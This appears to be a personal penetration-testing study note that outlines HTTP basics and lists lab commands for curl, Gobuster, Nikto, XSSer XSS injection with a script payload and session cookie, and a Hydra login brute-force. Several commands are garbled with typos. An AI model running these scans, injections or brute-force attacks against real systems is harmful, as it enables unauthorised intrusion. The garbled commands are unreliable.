- Website
- Web Server
- Off-Premise Hosting 

### HTTP Protocol 
- Headers
- Requests
- Response
- Browsers
- Sessions

### Requests
- Client
- Interacts with Server 
+ Methods 
	+ GET 
	+ HEAD 
	+ POST 
	+ PUT 
	+ DELETE 
	+ CONNECT 
	+ OPTIONS 
	+ TRACE 
	+ PATCH 
+ User-Agent

### Response 
+ Server 
+ Sends Resources 
+ Status Codes 
	+ 200 
	+ 302 
	+ 404 
	+ etc

- Browsers

- Sessions
- Cookies
- HTTPS

> Reading More:
	[[How Protocols Works and How to Decrypt Most of Them]]

##  Web and HTTP Protocol 

```bash
curl -I 192.168.55.2

curl -X OPTIONS 192.168.55.2

curl -X POST 192.168.55.2 -d "name=John&password=password" -v

curl 192.168.55.2/uploads/ --upload-file hello.txt

curl -X DELETE 192.168.55.2/uploads/hello.txt
```

## Directory Enumeration with Gobuster


```bash
gobuster dir -u http://192.25.36.1 -w /usr/share/wordlists/dirb/common.txt -b 463,404 -x .xml,.php -r
```


## Directory Enumeration with BurpSuite

![[Pasted image 20230718195920.png]]
![[Pasted image 20230718195935.png]]

## Scanning Web Application with Nikto

```bash
nikto

nikto -h http://192.168.25.2

nikto -h http://192.158.197.7/index.php/Ipageasrtitrary-file-inclusion.php -Tuning 5 -Displey V -output nikto.html -Format htm
```

##  XSS Attack with XSSer 
```bash
xsser --url "http://192.23.148.3/index.php?page=dns-Lookup.php" -p "Harget_host=Xss&dns-lookup-php&submit=put&tonsLookup=DNS"

xsser --url "http://192.23.148.3/index.php?page=dns-Lookup.php" -p "Harget_host=Xss&dns-lookup-php&submit=put&tonsLookup=DNS" --auto

xsser --url "http://192.23.148.3/index.php?page=dns-Lookup.php" -p "Harget_host=Xss&dns-lookup-php&submit=put&tonsLookup=DNS" -Fp "<script>alert(1);</script>"

```

## Authenticated XSS Attack with XSSer 

```bash
xsser --url 'http://192.212.191.3/htalet.php rstnamesXSSElastnamemschaekformmsubmit' --cooklie="security lavel=8; PHPSESSID=agbnSeogtidt37dtteqe7"

```

## Attacking HTTP Login Form with Hydra 

```bash
-hydra -L users -P passwords 192.107.115.3 http-post-form "/login.php:login=^USER^&password=^PASS^&security_level=0&form=submit:Invalid"
```

## Attacking Basic Auth with Burp Suite 


## Attacking HTTP Login Form with ZAProxy 